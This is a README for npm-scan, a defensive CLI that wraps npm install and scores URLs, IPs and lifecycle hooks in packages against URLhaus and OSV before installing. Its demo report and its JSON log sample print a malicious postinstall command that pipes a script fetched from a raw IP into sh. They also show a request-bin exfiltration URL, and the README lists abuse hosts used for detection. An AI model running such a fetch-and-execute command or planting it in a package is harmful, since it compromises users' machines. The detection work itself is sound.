# npm-scan

A local CLI security gateway that wraps `npm install`. Before any package lands on your machine, `npm-scan` fetches the tarball in isolation, judges every URL and IP it finds in context, shows you a report, and only proceeds when you say yes.

## How it works

```
npm-scan install <package>
       │
       ├─ Fetches the full manifest + tarball via pacote (no scripts run)
       ├─ Extracts to a temp directory
       ├─ Finds HTTP/HTTPS URLs and raw IPv4/IPv6 addresses in
       │    .js/.ts/.mjs/.cjs/.json, plus a structured walk of package.json
       ├─ Judges each one on five signals:
       │     • position    — metadata, comment, sourcemap, code, or lifecycle script
       │     • provenance  — does it match the package's own declared origins?
       │     • reachability— is a fetch/exec sink next to it?
       │     • code load   — is the URL the argument of require/import? (remote code)
       │     • structure   — scheme, raw IP, odd port, punycode, abuse infrastructure
       ├─ Checks the URLs against URLhaus and the package against OSV.dev
       └─ critical → blocks    warn → asks    info → shown, ignored
```

All other `npm` commands (e.g. `npm-scan ls`, `npm-scan run build`) are passed straight through to the native `npm` binary, unchanged.

## Demo

```
$ npm-scan install evil-pkg

[npm-scan] Report: evil-pkg → 1.0.2
  2 file(s) scanned
  intel/urlhaus: 41003 entries, fetched 2026-08-02T09:12:04.881Z
  intel/osv: 1 entries, fetched 2026-08-02T17:13:41.425Z

  CRITICAL — this package is a known-malicious artefact:
    MAL-2026-6374  Malicious code in evil-pkg (npm)

  Scripts (2 found, 1 run automatically on install):
    postinstall      [runs on install]  curl -s http://45.9.148.37/stage2.sh | sh
    test                                echo ok
    ↳ postinstall executes arbitrary code before you import anything

  CRITICAL (4 found, showing 4):
    https://webhook.site/8f2c1a90-collect
      index.js:8 · code
      ↳ known exfiltration infrastructure (request bin)
    http://185.220.101.5/p.bin
      index.js:10 · code
      ↳ raw IP address contacted directly, bypassing DNS
      ↳ reached via fetch, child_process, wget
    http://45.9.148.37/stage2.sh
      package.json:8 · script-hook
      ↳ URL inside a lifecycle script that npm runs automatically on install

  info (5 found, showing 5):
    https://github.com/owner/evil-pkg
      index.js:2 · comment
      ↳ matches the package's own repository field
    http://www.apache.org/licenses/LICENSE-2.0
      index.js:3 · comment
      ↳ standards or ecosystem host (apache.org)

  Blocked: 7 critical finding(s).
```

## How findings are judged

The scanner used to block on the presence of any URL. That is a *presence-of-URL
predicate*, not a detection signal — it says nothing about where a URL points, who
published it, or whether the code holding it ever runs. Since every published package
declares a `repository`, it fired on essentially the whole registry.

Each URL now carries four independent signals, and an ordered rule table maps them to a
severity. First match wins, so the table itself is the policy and every verdict comes
with the rule that produced it.

| | Blocks | Examples |
|---|---|---|
| **critical** | yes, without asking | URLhaus-listed URL; an OSV `MAL-` advisory for the package; any URL inside `preinstall`/`install`/`postinstall`; a URL passed straight to `require`/`import` (a remote dynamic dependency); a request bin, tunnel, Discord webhook or paste site in code; a raw public IP reached via `fetch`/`exec` |
| **warn** | asks, defaulting to No | a third-party URL reached from a sink; a version-pinned package-CDN module load; plaintext `http://` in code; a punycode host; an odd port; a URL ending in `.sh`/`.exe`; the package having any install hook at all |
| **info** | never | the package's own repository, homepage, bugs or tarball host; standards and licence hosts; anything in a comment, sourcemap directive or package.json metadata field; loopback and private addresses |

**Repository URLs are declassified by provenance, not by a whitelist.** The package's
own origins are derived per-package from its full manifest — `repository`, `homepage`,
`bugs`, `funding`, `author.url` and `dist.tarball`. A URL whose host matches one of
those is self-referential. On shared code hosts (github.com, gitlab.com, …) the first
path segment must match too, so a package's own `repository` field vouches for
`github.com/owner/repo` and not for `github.com/attacker/payload`.

Because that manifest is publisher-controlled, self-provenance is evidence rather than
absolution: every critical rule sits *above* it in the table. A compromised version of a
trusted package cannot clear itself by keeping its real metadata, and a URL in a
lifecycle hook is critical even when it points at the package's own repo.

**A required URL is treated as worse than a fetched one.** A fetched URL returns data
the package still has to do something with; a URL handed to `require`, `import`,
`import()`, `importScripts` or `new Worker` returns *code that has already run*, in
process, with full privileges, the moment the module is imported. That is a remote
dynamic dependency: the tarball you audited contains an address, not the code, and
nothing about the install pins what answers it.

Self-provenance is deliberately no defence here. A URL on the publisher's own domain is
still code that isn't in the tarball, isn't reviewable and isn't pinned, so a
`require('https://<own-domain>/x.js')` is critical exactly like any other host.

The one exception is a **fully version-pinned package CDN** — `unpkg.com/cliui@8.0.1/…`,
`cdn.jsdelivr.net/npm/pkg@1.2.3/…`, `esm.sh/react@18.2.0`. What is behind those is a
published npm artefact at a version that cannot be republished, and browser builds of
real packages do this (yargs' browser shim is the reference case). Immutable but still
off-tarball, so it warns rather than blocks. The pin carries the guarantee, not the
host: `unpkg.com/pkg`, `pkg@8` and `pkg@latest` resolve to whatever is newest, so they
stay critical.

Matching this needs the URL to be the loader's actual argument, not merely near it —
`require('fs')` sits at the top of nearly every file, so a proximity check would make
any URL beside it look like a remote load. The indirect shape (`const u = URL;
require(u)`) can only ever be a guess, so it feeds the sink rules and warns instead.
That proximity is measured in **characters, not lines**: prettier ships a 532,000-character
bundle whose line 11 holds both TypeScript's `aka.ms` diagnostic URLs and a
`require(t)` some 99,000 characters away, and a line-window scored all four as reachable.

**There is no URL whitelist, and there doesn't need to be one.** A list of good URLs is
unbounded and fails open on exactly the attack that matters. What is maintained instead
is the inverse — a short list of hosts with no plausible reason to appear in published
package code: ephemeral tunnels (ngrok, trycloudflare, serveo), out-of-band beacons
(interactsh, Burp Collaborator, webhook.site), chat drop points (Discord webhooks,
Telegram bot API), anonymous file drops (transfer.sh, file.io, 0x0.st) and dynamic DNS.
The only static allowlist is ~28 standards and ecosystem hosts (`spdx.org`, `w3.org`,
`schema.org`, `nodejs.org`, …) that appear in licence headers and JSON schemas, and it
only downgrades URLs already sitting in an inert position.

## Threat intelligence

Two free sources, both **offline-first**: feeds are cached under `~/.cache/npm-scan/`
and answered locally, so a sweep of a thousand packages makes one request and a rerun
returns identical verdicts. Every run log records which feed answered and when it was
downloaded.

| Source | Covers | Setup |
|---|---|---|
| [URLhaus](https://urlhaus.abuse.ch/) (abuse.ch) | URLs that distribute malware — the "postinstall fetches stage2.sh" pattern | free Auth-Key from [auth.abuse.ch](https://auth.abuse.ch/), exported as `URLHAUS_AUTH_KEY` |
| [OSV.dev](https://osv.dev/) | the package itself: `MAL-` advisories from the OpenSSF malicious-packages feed | none — keyless |

An exact URLhaus match is critical; a match on the *host* only is a warning, so one bad
file on a shared host can't blanket-block every package that references it.

Every lookup has a 3s timeout and **fails open**: a missing key, an outage or a corrupt
cache degrades to local signals with a one-line notice and never blocks an install or
crashes a sweep.

The key is read from `URLHAUS_AUTH_KEY`, either from the environment or from a `.env`
file in the working directory. `.env` is gitignored; copy `.env.example` to start.
A real environment variable always overrides the file, so CI secrets keep working.

```bash
cp .env.example .env              # then paste your key in — never commit it
npm-scan install some-package
npm-scan install some-package --offline         # never touch the network
npm-scan install some-package --refresh-intel   # force a feed refresh
```

Google Safe Browsing, VirusTotal and PhishTank were considered and not used: Safe
Browsing's Lookup API is non-commercial-only and ships full URLs to Google, VirusTotal's
free tier is 4 requests/minute (unusable for a package with 40 URLs, and submissions
become visible to its subscribers), and PhishTank has closed submissions.

## Installation

**Requirements:** Node.js ≥ 18.17.0

```bash
git clone https://github.com/your-username/npm-scan.git
cd npm-scan
npm install
npm run build
npm link
```

Verify the link worked:

```bash
npm-scan --version   # should print your npm version
```

## Usage

```bash
# Scan a package before installing
npm-scan install express
npm-scan i lodash@4.17.21

# Flags are forwarded to the real npm install
npm-scan install typescript --save-dev
npm-scan install react react-dom -E

# All other commands pass straight through
npm-scan ls
npm-scan run build
npm-scan outdated
```

## Evaluation logging

Every scanned package writes one structured JSON file to `eval_results/raw/`, so batch
runs against a labelled dataset leave a full trace without needing a re-run.

```bash
# Scan and log without ever installing — the mode to use for dataset sweeps
npm-scan install evil-pkg@1.0.2 --scan-only --dataset=D_mal

# Sweep a whole list
while read -r pkg; do npm-scan install "$pkg" --scan-only --dataset=D_ben; done < benign.txt
```

| Flag | Env var | Effect |
|------|---------|--------|
| `--scan-only` | `NPM_SCAN_SCAN_ONLY=1` | Scan + log every spec, never hand over to `npm install`. Implies `--no-prompt`. |
| `--dataset=D_mal\|D_ben` | `NPM_SCAN_DATASET` | Ground-truth label; drives TP/FP/TN/FN classification. |
| `--no-prompt` | `NPM_SCAN_NONINTERACTIVE=1` | Never ask — proceed only on a clean report. |
| `--log-dir=<path>` | `NPM_SCAN_LOG_DIR` | Log destination (default `eval_results/raw`, relative to cwd). |
| `--no-log` | `NPM_SCAN_LOG=0` | Disable logging for this run. |
| `--offline` | `NPM_SCAN_OFFLINE=1` | Never fetch threat intel; use the cache or degrade to local signals. |
| `--refresh-intel` | — | Ignore the cache TTL and re-download the feeds. |
| `--intel-timeout=<ms>` | `NPM_SCAN_INTEL_TIMEOUT` | Per-lookup timeout (default 3000). |

These flags are consumed by `npm-scan` and never forwarded to the real `npm`.

One file per scanned spec, named `<timestamp>__<spec>__<run-id>.json`:

```json
{
  "package_name": "evil-pkg",
  "version": "1.0.2",
  "dataset_category": "D_mal",
  "execution_time_ms": 142,
  "manifest_urls_found": ["http://45.9.148.37/stage2.sh"],
  "ast_intents": ["fetch", "child_process", "wget", "curl"],
  "semantic_mismatch_detected": null,
  "classification": "TP",
  "error_log": null,

  "run_id": "…", "timestamp": "…", "spec": "evil-pkg@1.0.2",
  "verdict": "blocked", "detected_suspicious": true, "installed": false,
  "files_scanned": 2, "ips_found": ["45.9.148.37"],
  "auto_run_scripts": ["postinstall"], "publish_scripts": [],
  "scripts": { "postinstall": "curl -s http://45.9.148.37/stage2.sh | sh" },

  "severity_counts": { "critical": 7, "warn": 1, "info": 5 },
  "url_findings": [
    {
      "match": "http://45.9.148.37/stage2.sh",
      "severity": "critical", "position": "script-hook",
      "provenance": "third-party", "sinks": ["curl"],
      "reasons": ["URL inside a lifecycle script that npm runs automatically on install"],
      "occurrences": 1, "first_seen": "package.json:8"
    }
  ],
  "ip_findings": [ "…same shape…" ],
  "self_origins": [
    { "host": "github.com", "owner": "owner", "field": "repository" },
    { "host": "evil-pkg.dev", "owner": null, "field": "homepage" }
  ],
  "osv_advisories": [
    { "id": "MAL-2026-6374", "summary": "Malicious code in evil-pkg (npm)", "malicious": true }
  ],
  "intel_snapshot": [
    { "name": "urlhaus", "status": "ready", "reason": null,
      "fetchedAt": "2026-08-02T09:12:04.881Z", "entryCount": 41003 },
    { "name": "osv", "status": "ready", "reason": null,
      "fetchedAt": "2026-08-02T17:13:41.425Z", "entryCount": 1 }
  ]
}
```

**Classification** is derived from the dataset label and whether the scan produced at
least one finding worth a human decision — a `critical` or a `warn`:
`D_mal` + detected → `TP`, `D_mal` + clean → `FN`, `D_ben` + detected → `FP`,
`D_ben` + clean → `TN`. Without `--dataset` it stays `null`.

Informational findings never count as a detection. That is the change that makes the
`FP` and `TN` columns mean anything: under the old "any URL is a detection" rule, every
package with a `repository` field scored as a positive.

**`intel_snapshot` is what makes a sweep reproducible.** A verdict that depended on
threat intel is only interpretable next to the feed it was drawn from, so each run
records the source, its status, and the timestamp of the cached snapshot. Re-running a
sweep with `--offline` against an unchanged cache reproduces every verdict exactly.

**`ast_intents` is no longer a placeholder** — it carries the network and process sinks
found next to a finding (`fetch`, `child_process`, `curl`, …). It is still a regex
proximity check within ±2 lines rather than a real AST pass, so treat it as a
reachability hint, not a call graph. `semantic_mismatch_detected` remains `null`.

**`code_load_intents`** is the subset of those intents that loads remote *code* rather
than fetching data (`require`, `import()`, `import from`, `importScripts`, `new Worker`),
and each finding carries its own `loaders`. It is a separate column because a remote
dynamic dependency is a different class of finding from a callback, and a sweep should
be able to count the two apart.

Failed scans (404s, network errors) are logged too, with `verdict: "error"`,
the message in `error_log`, and `classification: null` — an incomplete run can't be
scored either way. A log-write failure prints a warning and never blocks an install.

## Shell alias (transparent wrapping)

To make `npm` itself go through `npm-scan`, add an alias to your shell profile:

```bash
# ~/.zshrc or ~/.bashrc
alias npm="npm-scan"
```

Then reload:

```bash
source ~/.zshrc
```

> **No infinite recursion risk.** Internally, `npm-scan` calls `spawn('npm', ...)` which resolves through `PATH` to the real npm binary — shell aliases are never involved.

## Project structure

```
src/
  cli.ts        # Entrypoint — arg parsing, scan orchestration
  env.ts        # Minimal .env loader (real env vars take precedence)
  analyzer.ts   # pacote fetch + file walker + regex scanner + position tagging
  classify.ts   # Signals and the severity rule table (pure, directly testable)
  origins.ts    # Self-origin derivation, ecosystem allowlist, abuse-infra list
  intel/
    cache.ts    # ~/.cache/npm-scan with TTL and snapshot metadata
    urlhaus.ts  # abuse.ch feed download + local host/URL index
    osv.ts      # OSV.dev package query, MAL- advisories
  prompt.ts     # ANSI-coloured severity-grouped report + Y/N prompt
  installer.ts  # Native npm passthrough and final install handover
  logger.ts     # Structured JSON run logs + TP/FP/TN/FN classification
scripts/
  add-hashbang.mjs  # Post-build: prepends #!/usr/bin/env node
```

## What is and isn't scanned

| Checked | Not checked |
|---------|-------------|
| `.js`, `.ts`, `.mjs`, `.cjs`, `.json` files | Binary `.node` native addons |
| HTTP/HTTPS URLs in source | Base64/hex-encoded strings |
| Raw IPv4 and IPv6 addresses | Transitive dependencies |
| Lifecycle hooks in the root `package.json` | URLs assembled at runtime (`"https://" + host`) |
| URLs passed to `require`/`import`/`new Worker` | Whether a remote module is on a reachable code path |
| URLhaus reputation, OSV `MAL-` advisories | Whether a sink is genuinely reachable (no call graph) |

A URL match requires a plausible host — a domain with a real TLD, an IPv4 literal, a
bracketed IPv6 address, or `localhost` — so bundler artefacts like `https://$1/` are
not reported. The cost is that a URL built by concatenation is invisible to a regex
scan; catching those needs the AST pass. IPv6 requires the full eight-group form or a
genuine `::`, which keeps minified fragments like `3:2:1` out, and an IPv4 match is
rejected when it's a slice of a longer dotted-numeric run (`1.2.3.4.5` is a version
string, not an address).

`package.json` is walked as a document rather than as text, so `repository`, `homepage`
and `bugs` are read as metadata fields and only `scripts` values are treated as
commands. Hooks are split by when npm actually runs them: `preinstall`, `install` and
`postinstall` execute when you install a registry tarball, while `prepare`, `prepack`
and friends only run when publishing or installing from git — so only the former carry
install-time weight.

URLs and IP literals are deduplicated by matched string and judged at the worst position
they appeared in. A URL in both the README-style header comment and a `postinstall` is
one critical finding, not one info and one critical.

**Known limits.** Reachability is line proximity, not a call graph, so a URL far from
its `fetch` is missed and one next to an unrelated call is over-credited. Block-comment
detection only opens on a line starting with `/*`, deliberately — an unanchored scan
would let a package hide a URL behind a `/*` inside a string literal and have it read as
inert. Transitive dependencies are still not scanned: `npm-scan install foo` judges
`foo`, not what `foo` pulls in.

> `npm-scan` is a first-line review tool, not a sandbox. It catches common patterns used in supply chain attacks (phone-home URLs, raw IP callbacks, surprise install hooks) but does not execute or emulate code.

## Build scripts

```bash
npm run build   # tsc → add hashbang → chmod 755
npm run clean   # rm -rf dist
```

## Tech stack

- **TypeScript** with `module: NodeNext` (full ESM)
- **[pacote](https://github.com/npm/pacote)** — npm's own tarball fetcher, with `ignoreScripts: true` and `fullMetadata: true` (the abbreviated manifest omits `repository`/`homepage`/`bugs`, which provenance needs)
- **[hosted-git-info](https://github.com/npm/hosted-git-info)** — npm's own parser for the `git+https://`, `git://` and `user/repo` shorthands in `repository` fields
- **[prompts](https://github.com/terkelg/prompts)** — lightweight interactive CLI prompts

## License

MIT
